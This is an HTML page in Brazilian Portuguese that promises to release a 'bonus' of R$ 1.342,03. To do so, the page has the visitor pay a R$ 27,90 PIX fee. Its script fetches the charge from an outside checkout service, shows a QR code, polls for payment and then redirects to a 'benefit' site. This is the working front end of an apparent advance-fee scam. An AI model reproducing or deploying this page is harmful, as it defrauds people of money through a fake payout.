<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@700;900&display=swap" rel="stylesheet">

<style>
* { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }

.button-container {
    display: flex;
    justify-content: center;
    align-items: center;
    width: 100%;
    padding: 20px;
}

.btn-resgatar {
    background: #FF5F2C;
    color: white;
    border: none;
    width: 100%;
    max-width: 380px;
    padding: 25px 20px;
    font-size: 22px;
    font-weight: 900;
    text-transform: uppercase;
    border-radius: 12px;
    cursor: pointer;
    box-shadow: 0 8px 0 #d1491f, 0 15px 20px rgba(0,0,0,0.2);
    transition: all 0.1s;
    animation: pulse-orange 2s infinite;
}

.btn-resgatar:disabled {
    background: #ccc;
    box-shadow: none;
    animation: none;
    cursor: wait;
}

@keyframes pulse-orange {
    0% { transform: scale(1); }
    70% { transform: scale(1.02); }
    100% { transform: scale(1); }
}

.overlay {
    display: none;
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    background: rgba(0,0,0,0.7);
    z-index: 9998;
}

.modal-pix {
    display: none;
    position: fixed;
    top: 50%; left: 50%;
    transform: translate(-50%, -50%);
    background: white;
    padding: 30px;
    border-radius: 20px;
    box-shadow: 0 20px 50px rgba(0,0,0,0.3);
    z-index: 9999;
    text-align: center;
    width: 90%;
    max-width: 400px;
}

.btn-copiar {
    background: #28a745;
    color: white;
    border: none;
    padding: 12px;
    width: 100%;
    border-radius: 50px;
    font-weight: 700;
    margin-top: 10px;
    cursor: pointer;
}

.btn-final {
    display: none;
    background: #007bff;
    color: white;
    border: none;
    padding: 15px;
    width: 100%;
    border-radius: 50px;
    font-weight: 700;
    font-size: 16px;
    margin-top: 15px;
    cursor: pointer;
}
</style>
</head>

<body>

<div class="button-container">
    <button id="btn_pagar" class="btn-resgatar" onclick="gerarPix()">
        RESGATAR R$ 1.342,03
    </button>
</div>

<div class="overlay" id="overlay"></div>

<div class="modal-pix" id="modal_pix">
    <h3 id="status_titulo">‚úÖ QR CODE GERADO</h3>
    <p id="status_texto" style="font-size:13px;">
        Finalize o pagamento para liberar seu saque.
    </p>

    <div id="qr_code_div"></div>

    <textarea id="txt_codigo"
        style="width:100%; height:60px; margin-top:10px; background:#f5f5f5;
        border:1px solid #ddd; border-radius:8px; padding:10px;
        font-size:12px;" readonly>Gerando PIX...</textarea>

    <button class="btn-copiar" onclick="copiarCodigo()">COPIAR C√ìDIGO PIX</button>

    <!-- BOT√ÉO FINAL (INVIS√çVEL AT√â PAGAR) -->
    <button class="btn-final" id="btn_final"
        onclick="window.location.href='https://recuperabonushopp.com/elementor-1064'">
        ACESSAR MEU BENEF√çCIO
    </button>

</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>

<script>

function gerarPix() {

    const btn = document.getElementById("btn_pagar");
    btn.innerHTML = "PROCESSANDO...";
    btn.disabled = true;

    fetch("https://checkout-pix-profissional.onrender.com/pix", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ valor: "27.90" })
    })
    .then(res => res.json())
    .then(data => {

        if (data.success) {

            const transactionId = data.transactionId || data.id || data.txid;

            document.getElementById("overlay").style.display = "block";
            document.getElementById("modal_pix").style.display = "block";
            document.getElementById("txt_codigo").value = data.payload;

            const qrDiv = document.getElementById("qr_code_div");
            qrDiv.innerHTML = "";

            new QRCode(qrDiv, {
                text: data.payload,
                width: 200,
                height: 200
            });

            if (transactionId) {
                verificarPagamento(transactionId);
            }

        } else {
            alert("Erro ao gerar pagamento.");
            btn.innerHTML = "RESGATAR R$ 1.342,03";
            btn.disabled = false;
        }
    });
}

function verificarPagamento(transactionId) {

    const intervalo = setInterval(() => {

        fetch(`https://checkout-pix-profissional.onrender.com/status/${transactionId}`)
        .then(res => res.json())
        .then(data => {

            if (data.status === "approved" || data.status === "paid") {

                clearInterval(intervalo);

                document.getElementById("status_titulo").innerHTML = "üéâ PAGAMENTO APROVADO!";
                document.getElementById("status_texto").innerHTML =
                    "Seu pagamento foi confirmado com sucesso.";

                document.getElementById("btn_final").style.display = "block";
            }

        });

    }, 5000);
}

function copiarCodigo() {
    const copyText = document.getElementById("txt_codigo");
    copyText.select();
    document.execCommand("copy");
    alert("C√≥digo PIX copiado!");
}

</script>

</body>
</html>
